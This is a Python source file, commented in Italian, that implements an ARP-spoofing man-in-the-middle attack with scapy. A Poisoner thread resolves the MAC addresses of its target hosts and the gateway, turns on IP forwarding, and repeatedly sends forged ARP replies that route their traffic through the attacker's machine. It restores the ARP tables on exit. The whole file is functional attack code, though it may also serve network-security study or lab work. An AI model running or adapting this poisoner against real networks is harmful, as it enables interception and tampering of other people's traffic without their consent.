import config
from scapy.all import *
import time


ETHER_BROADCAST = "ff:ff:ff:ff:ff:ff"


def enable_ip_forwarding():
    """
    abilita il forwarding di pacchetti
    """
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forwarding():
    """
    disabilita il forwarding di pacchetti
    """
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def get_mac(ip, interface):
    """
    :param ip: indirizzo ip di cui si vuole ottenere il MAC
    :param interface: interfaccia su cui mandare la richiesta ARP
    :return: indirizzo MAC ottenuto dalla risposta ARP
    """
    ans, unans = sr(ARP(op=1, pdst=ip, hwdst=ETHER_BROADCAST), verbose=config.DEBUG,
                     timeout=2, retry=2, iface=interface)
    for s, r in ans:
        return r[ARP].hwsrc
    return None

def poisoning(victim_ip, victim_mac, mim_ip):
    """
    :param victim_ip: indirizzo ip della vittima
    :param victim_mac: indirizzo MAC della vittima
    :param mim_ip: altro indirizzo ip coniinvolto nel MITM
    """
    send(ARP(op=2, pdst=victim_ip, psrc=mim_ip, hwdst=victim_mac), verbose=config.DEBUG)


def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    """
    ripristina lo stato della rete a quello che era precedemente all'attacco MITM

    :param gateway_ip: indirizzo ip del gateway
    :param gateway_mac: indirizzo MAC del gateway
    :param target_ip: indirizzo ip del target
    :param target_mac: indirizzo MAC del target
    """
    send(ARP(op=2, hwdst=ETHER_BROADCAST, pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip),
         count=5, verbose=config.DEBUG)

    send(ARP(op=2, hwdst=ETHER_BROADCAST, pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip),
         count=5, verbose=config.DEBUG)


class Poisoner(Thread):
    """
    classe che rappresenta l'attaccante MITM

    """

    def __init__(self, ip2poison, gateway_ip, interface):
        """
        :param ip2poison: insieme di indirizzi ip da avvelenare
        :param gateway_ip: indirizzo ip del gateway
        :param interface: interfaccia su cui mandare i pacchetti ARP
		:except ValueError: lanciata se per almeno uno degli indirizzi ip non è possibile assocargli un mac address
        """
        Thread.__init__(self)

        # mHostPoison lista di coppie del tipo (ip address, MAC address)
        self.mHostPoison = []

        self.mGatewayIp = gateway_ip
        self.mGatewayMac = None
        self.mInterface = interface

        # isInterrupted flag utilizzato per interrompere l'esecuzione del thread
        self.isInterrupted = False

        # ottengo i MAC dei vari ip degli host da avvelenare
        for target_ip in ip2poison:
            target_mac = get_mac(target_ip, self.mInterface)
            if target_mac is None:
                raise ValueError("L'indirizzo IP " + target_ip + " non è valido")
            self.mHostPoison.append((target_ip, target_mac))
            if config.DEBUG:
                print("[target ip:] ", target_ip, end='\n')
                print("[target mac:] ", target_mac, end='\n')

        # ottengo il MAC del gateway
        self.mGatewayMac = get_mac(self.mGatewayIp, self.mInterface)
        if self.mGatewayMac is None:
            raise ValueError("L'indirizzo IP " + self.mGatewayIp + " non è valido")
        

    def stop(self):
        """
        setta il flag che determina l'interruzione del thread Poisoner
        """
        self.isInterrupted = True

    def run(self):
        """
        ciclo principale del thread poisoner
        """
        if config.DEBUG:
            print("[gateway ip:] ", self.mGatewayIp, end='\n')
            print("[gateway mac:] ", self.mGatewayMac, end='\n')

        # abilito il forwarding
        enable_ip_forwarding()

        # invio risposte ARP per il MITM attack
        while True:
            for target_ip, target_mac in self.mHostPoison:
                poisoning(target_ip, target_mac, self.mGatewayIp)
                poisoning(self.mGatewayIp, self.mGatewayMac, target_ip)
            # attendo un breve intervallo di tempo per evitare di sovraccaricare la rete
            time.sleep(config.WAIT_TIME_POISON)
            # controllo se il thread è stato interrotto
            if self.isInterrupted:
                break

        # ripristino la rete
        for target_ip, target_mac in self.mHostPoison:
            restore_network(self.mGatewayIp, self.mGatewayMac, target_ip, target_mac)

        # disabilito il forwarding
        disable_ip_forwarding()
